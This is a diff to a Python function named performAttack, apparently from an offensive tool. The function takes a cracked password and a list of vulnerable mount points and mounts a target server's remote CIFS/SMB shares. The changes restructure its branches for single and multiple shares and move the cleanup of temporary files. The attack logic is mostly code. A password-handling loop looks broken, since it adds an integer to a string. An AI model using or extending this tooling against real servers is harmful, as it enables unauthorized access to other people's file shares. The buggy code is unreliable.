@@ -38,7 +38,7 @@ def performAttack(location, serverIP, username, password=None):
 				for i in range(pwdIndex+1, len(password)):
 					password += pwdIndex+1
 		f.close()
-		
+		os.remove("password.txt")
 		print ("Cracked Password:" + password)
 	try:	
 		shutil.rmtree(location)	
@@ -53,10 +53,19 @@ def performAttack(location, serverIP, username, password=None):
 	f.close()
 	f = open('vulnerableMountPoints.txt', 'r')
 	mountpoints = parseVulnerabilitiesFile(f)
+	f.close()
+
 	if len(mountpoints) == 0:
 		print ("No mountpoint found")
-	f.close()
-	if len(mountpoints) > 1:
+	
+	
+	elif len(mountpoints) == 1:
+		os.mkdir(location)
+		mountpoint = mountpoints[0]
+		mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, location]
+		call(mountArgs)
+		print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + location)
+	else:
 		os.mkdir(location)
 		lastFolder = str.split(location, "/")
 		lastFolder = lastFolder[len(lastFolder)-1]
@@ -68,13 +77,7 @@ def performAttack(location, serverIP, username, password=None):
 			mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, tempLocation]
 			call(mountArgs)
 			print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + tempLocation)
-	else:
-		os.mkdir(location)
-		mountpoint = mountpoints[0]
-		mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, location]
-		call(mountArgs)
-		print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + location)
-	os.remove("password.txt")
+	
 	os.remove("vulnerableMountPoints.txt")
 		
 
